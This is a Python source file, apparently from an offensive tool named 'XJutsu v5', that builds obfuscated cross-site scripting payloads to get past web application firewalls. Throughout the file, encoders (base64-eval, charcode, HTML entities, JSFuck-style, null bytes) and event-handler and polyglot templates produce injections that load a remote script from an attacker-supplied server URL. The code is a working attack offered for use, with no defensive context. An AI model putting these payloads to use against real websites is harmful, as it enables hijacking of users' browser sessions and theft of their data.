"""
XJutsu v5 - Payload Obfuscation
Multiple encoding and obfuscation techniques for bypassing WAFs
"""

import base64
import html
import urllib.parse
import random
import string
import json


class PayloadObfuscator:
    """
    Various obfuscation techniques for XSS payloads
    """
    
    @staticmethod
    def base64_encode(payload):
        """
        Base64 encode payload with eval decoder
        """
        encoded = base64.b64encode(payload.encode()).decode()
        return f"eval(atob('{encoded}'))"
    
    @staticmethod
    def url_encode(payload):
        """
        URL encode payload
        """
        return urllib.parse.quote(payload, safe='')
    
    @staticmethod
    def double_url_encode(payload):
        """
        Double URL encode for bypassing some filters
        """
        return urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe='')
    
    @staticmethod
    def html_entity_encode(payload):
        """
        HTML entity encode (decimal)
        """
        return ''.join(f'&#{ord(c)};' for c in payload)
    
    @staticmethod
    def html_entity_hex_encode(payload):
        """
        HTML entity encode (hexadecimal)
        """
        return ''.join(f'&#x{ord(c):x};' for c in payload)
    
    @staticmethod
    def unicode_encode(payload):
        """
        Unicode escape encoding
        """
        return ''.join(f'\\u{ord(c):04x}' for c in payload)
    
    @staticmethod
    def hex_encode(payload):
        """
        Hex encoding with String.fromCharCode
        """
        hex_chars = ','.join(f'0x{ord(c):02x}' for c in payload)
        return f"String.fromCharCode({hex_chars})"
    
    @staticmethod
    def charcode_encode(payload):
        """
        Decimal charcode encoding
        """
        codes = ','.join(str(ord(c)) for c in payload)
        return f"String.fromCharCode({codes})"
    
    @staticmethod
    def jsfuck_basic(payload):
        """
        Basic JSFuck-style obfuscation (simplified)
        Actually encodes to eval-able JS
        """
        # This is a simplified version - real JSFuck is much longer
        encoded = base64.b64encode(payload.encode()).decode()
        return f"[][(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]]](atob('{encoded}')))()"
    
    @staticmethod
    def random_case(payload):
        """
        Randomize case for bypassing case-sensitive filters
        """
        return ''.join(
            c.upper() if random.choice([True, False]) else c.lower()
            for c in payload
        )
    
    @staticmethod
    def add_null_bytes(payload):
        """
        Insert null bytes (for some legacy systems)
        """
        return '\x00'.join(payload)
    
    @staticmethod
    def add_comments(payload):
        """
        Add random JS comments
        """
        parts = list(payload)
        result = []
        for i, c in enumerate(parts):
            result.append(c)
            if random.random() < 0.3 and c not in '\'\"':
                result.append(f'/**/')
        return ''.join(result)
    
    @staticmethod
    def constructor_method(payload):
        """
        Use constructor method to execute
        """
        encoded = base64.b64encode(payload.encode()).decode()
        return f"[].constructor.constructor('return eval(atob(\"{encoded}\"))')();"
    
    @staticmethod
    def settimeout_wrapper(payload):
        """
        Wrap in setTimeout
        """
        encoded = base64.b64encode(payload.encode()).decode()
        return f"setTimeout(atob('{encoded}'))"
    
    @staticmethod
    def setinterval_wrapper(payload):
        """
        Wrap in setInterval (executes once then clears)
        """
        encoded = base64.b64encode(payload.encode()).decode()
        return f"var x=setInterval(function(){{eval(atob('{encoded}'));clearInterval(x)}},1)"
    
    @staticmethod
    def location_hash(server_url):
        """
        Use location hash technique
        """
        return f"eval(location.hash.slice(1))#var s=document.createElement('script');s.src='{server_url}';document.head.appendChild(s)"
    
    @staticmethod
    def svg_payload(inner_js):
        """
        SVG-based payload
        """
        return f'<svg/onload="{inner_js}">'
    
    @staticmethod
    def img_payload(inner_js):
        """
        IMG-based payload
        """
        return f'<img src=x onerror="{inner_js}">'
    
    @staticmethod
    def body_payload(inner_js):
        """
        Body onload payload
        """
        return f'<body onload="{inner_js}">'
    
    @staticmethod
    def details_payload(inner_js):
        """
        Details/summary payload (less filtered)
        """
        return f'<details open ontoggle="{inner_js}"><summary>x</summary></details>'
    
    @staticmethod
    def marquee_payload(inner_js):
        """
        Marquee payload (legacy but sometimes works)
        """
        return f'<marquee onstart="{inner_js}">'
    
    @staticmethod
    def video_payload(inner_js):
        """
        Video/audio payload
        """
        return f'<video><source onerror="{inner_js}">'
    
    @staticmethod
    def input_payload(inner_js):
        """
        Input autofocus payload
        """
        return f'<input onfocus="{inner_js}" autofocus>'
    
    @staticmethod
    def generate_polyglot(server_url):
        """
        Generate polyglot payload that works in multiple contexts
        """
        return f'''jaVasCript:/*-/*`/*\\`/*'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=eval(atob('{base64.b64encode(f"var s=document.createElement('script');s.src='{server_url}';document.head.appendChild(s)".encode()).decode()}'))//>\\x3e'''
    
    @classmethod
    def generate_all_payloads(cls, server_url, payload_id=None):
        """
        Generate all payload variants
        """
        if payload_id:
            js_url = f"{server_url}/p/{payload_id}.js"
        else:
            js_url = f"{server_url}/x.js"
        
        base_script = f"var s=document.createElement('script');s.src='{js_url}';document.head.appendChild(s)"
        
        payloads = {
            'basic': {
                'script_tag': f'<script src="{js_url}"></script>',
                'img_onerror': cls.img_payload(base_script),
                'svg_onload': cls.svg_payload(base_script),
                'input_onfocus': cls.input_payload(base_script),
                'details_ontoggle': cls.details_payload(base_script),
                'video_onerror': cls.video_payload(base_script),
            },
            'encoded': {
                'base64': f'<script>eval(atob("{base64.b64encode(base_script.encode()).decode()}"))</script>',
                'charcode': f'<script>{cls.charcode_encode(base_script)}</script>',
                'url_encoded': cls.url_encode(f'<script src="{js_url}"></script>'),
                'double_url': cls.double_url_encode(f'<script src="{js_url}"></script>'),
                'html_entity': cls.html_entity_encode(f'<script src="{js_url}"></script>'),
            },
            'advanced': {
                'constructor': f'<script>{cls.constructor_method(base_script)}</script>',
                'settimeout': f'<script>{cls.settimeout_wrapper(base_script)}</script>',
                'polyglot': cls.generate_polyglot(js_url),
            },
            'event_handlers': {
                'onclick': f'" onclick="{base_script}" x="',
                'onmouseover': f'" onmouseover="{base_script}" x="',
                'onfocus': f'" onfocus="{base_script}" autofocus x="',
                'onerror': f'" onerror="{base_script}" src=x x="',
            },
            'filter_bypass': {
                'case_variation': cls.random_case(f'<ScRiPt SrC="{js_url}"></sCrIpT>'),
                'null_bytes': f'<scr\x00ipt src="{js_url}"></scr\x00ipt>',
                'newlines': f'<script\nsrc="{js_url}"\n></script>',
                'tabs': f'<script\tsrc="{js_url}"\t></script>',
            }
        }
        
        return payloads
    
    @classmethod
    def get_payload_for_context(cls, context, server_url, payload_id=None):
        """
        Get best payload for specific context
        
        Contexts:
        - html_attribute: Inside an HTML attribute
        - html_tag: Inside HTML content
        - javascript: Inside JS code
        - url: Inside a URL
        - css: Inside CSS
        """
        if payload_id:
            js_url = f"{server_url}/p/{payload_id}.js"
        else:
            js_url = f"{server_url}/x.js"
        
        base_script = f"var s=document.createElement('script');s.src='{js_url}';document.head.appendChild(s)"
        
        contexts = {
            'html_attribute': f'" onfocus="{base_script}" autofocus="',
            'html_tag': f'<script src="{js_url}"></script>',
            'javascript': f"';{base_script};//",
            'url': f"javascript:{cls.url_encode(base_script)}",
            'css': f"expression({base_script})",  # IE only, legacy
        }
        
        return contexts.get(context, contexts['html_tag'])
